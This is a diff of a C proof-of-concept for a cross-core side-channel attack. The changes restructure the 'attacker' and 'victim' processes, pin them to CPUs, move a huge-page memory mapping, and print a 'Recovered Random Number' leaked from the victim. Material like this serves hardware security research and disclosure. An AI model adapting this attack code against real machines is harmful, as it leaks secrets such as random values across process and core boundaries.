@@ -11,7 +11,7 @@
 
 
 
-void victim(int cpu, int reps, void *mem){
+void victim(int cpu, int reps){
     set_processor_affinity(cpu);
     while(reps--){
         usleep(CYCLE_LENGTH);
@@ -22,11 +22,8 @@ void victim(int cpu, int reps, void *mem){
     while(1);
 }
 
-void attacker(int reps){
-    uint8_t *mem =
-            mmap(NULL, _page_size * 257, PROT_READ | PROT_WRITE,
-                 MAP_ANONYMOUS | MAP_PRIVATE | MAP_POPULATE | MAP_HUGETLB, -1, 0) + 1;
-    memset(mem, 0xFF, _page_size * 256);
+void attacker(int cpu, int reps, void* mem){
+    set_processor_affinity(cpu);
     char staging_buffer[65];
     staging_buffer[64] = 0;
 
@@ -46,7 +43,6 @@ void attacker(int reps){
         printf("[\e[31mATTACKER\e[39m] Recovered Random Number \e[31m0x%16lx\e[39m\n", random_number);
         fflush(stdout);
     }
-    munmap(mem-1, _page_size * 257);
 }
 
 
@@ -67,8 +63,8 @@ int main(int argc, char **args) {
     pid = fork();
     if (!pid) victim_cpuid(0x80000002ul, writer_cpu);
     pid2 = fork();
-    if(!pid2) victim(offcore_cpu, 50, mem);
-    attacker(50);
+    if(!pid2) attacker(reader_cpu, 50, mem);
+    victim(offcore_cpu, 50);
     kill(pid2, SIGKILL);
     kill(pid, SIGKILL);
     munmap(mem-1, _page_size * 257);
